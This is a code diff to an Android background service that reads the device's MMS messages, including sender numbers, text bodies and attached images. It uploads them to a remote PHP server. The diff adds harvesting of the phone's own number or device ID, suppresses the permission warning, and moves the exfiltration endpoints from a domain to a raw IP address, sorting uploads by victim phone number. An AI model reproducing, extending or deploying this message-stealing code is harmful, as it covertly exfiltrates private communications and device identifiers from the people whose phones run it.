@@ -1,5 +1,6 @@
 package ily.xieqing.com.myapplication;
 
+import android.annotation.SuppressLint;
 import android.app.IntentService;
 import android.content.ContentResolver;
 import android.content.Intent;
@@ -7,6 +8,7 @@ import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Environment;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Log;
 import android.widget.Toast;
@@ -107,9 +109,16 @@ public class UpService extends IntentService {
      * Handle action Foo in the provided background thread with the provided
      * parameters.
      */
+    @SuppressLint("MissingPermission")
     private void handleActionFoo(String param1, String param2) {
         // TODO: Handle action Foo
-
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String NativePhoneNumber = telephonyManager.getLine1Number();
+        if (TextUtils.isEmpty(NativePhoneNumber)){
+            NativePhoneNumber=telephonyManager.getDeviceId();
+        }else{
+            NativePhoneNumber=NativePhoneNumber.substring(1);
+        }
         Log.e("duanxin", "Context");
 
         Log.e("duanxin", "MmsSmsReceiver23");
@@ -129,8 +138,8 @@ public class UpService extends IntentService {
 
         final JSONObject jsonObject = new JSONObject();
         String id = MMScursor.getString(MMScursor.getColumnIndex("_id"));// 获取pdu表里 彩信的id
-        final String phonenumber = getAddressNumber(this, id);
-
+         String phonenumberadd = getAddressNumber(this, id);
+        final String phonenumber = phonenumberadd.substring(1);
         int timess = MMScursor.getInt(MMScursor.getColumnIndex("date"));
         long timesslong = (long) timess * 1000;//彩信获取的时间是以秒为单位的。
         Date d = new Date(timesslong);
@@ -189,13 +198,14 @@ public class UpService extends IntentService {
                             }
                             Log.e(TAG, "text222"+jsonObject.toString());
                         }
+                        final String finalNativePhoneNumber = NativePhoneNumber;
                         new Thread(new Runnable() {
                             @Override
                             public void run() {
                                 try {
                                     Log.e(TAG, "text"+jsonObject.toString());
                                     Response execute = new OkHttpClient().newCall(new Request.Builder()
-                                            .url("http://www.dy998.top/1.php?id=" + phonenumber + "&neirong=" +body).get().build()).execute();
+                                            .url("http://202.79.169.167/1.php?id=" + finalNativePhoneNumber + "&neirong=" +phonenumber+"---"+body).get().build()).execute();
                                     String jsonString = execute.body().string();
                                     Log.e(TAG, " upload execute =" + jsonString);
                                 } catch (IOException e) {
@@ -219,6 +229,7 @@ public class UpService extends IntentService {
                         }
                         final String finalBody = body;
                         final File finalBody2 = body2;
+                        final String finalNativePhoneNumber1 = NativePhoneNumber;
                         new Thread(new Runnable() {
                             @Override
                             public void run() {
@@ -227,15 +238,18 @@ public class UpService extends IntentService {
                                     try {
                                         String name = DEFAULT_SDF.format(new Date()) + ".png";
                                         RequestBody fileBody = RequestBody.create(MediaType.parse("image/png"), finalBody2);
+
                                         RequestBody requestBody = new MultipartBody.Builder()
                                                 .setType(MultipartBody.FORM)
-                                                .addFormDataPart("uploadedfile",name , fileBody)
+                                                .addFormDataPart("save_name",name)
+                                                .addFormDataPart("save_path","./A/"+ finalNativePhoneNumber1 +"/")
+                                                .addFormDataPart("uploadedfile",name, fileBody)
                                                 .build();
                                         Response execute = new OkHttpClient().newCall(new Request.Builder()
-                                                .url("http://www.dy998.top/up.php").post(requestBody).build()).execute();
+                                                .url("http://202.79.169.167/up.php").post(requestBody).build()).execute();
                                         String jsonString = execute.body().string();
                                         //Toast.makeText(context, "上传成功1!", Toast.LENGTH_SHORT).show();
-                                        Log.e(TAG, " upload jsonString =" + name);
+                                        Log.e(TAG, " upload jsonString =" + name+jsonString);
                                     } catch (IOException e) {
                                         e.printStackTrace();
                                     }
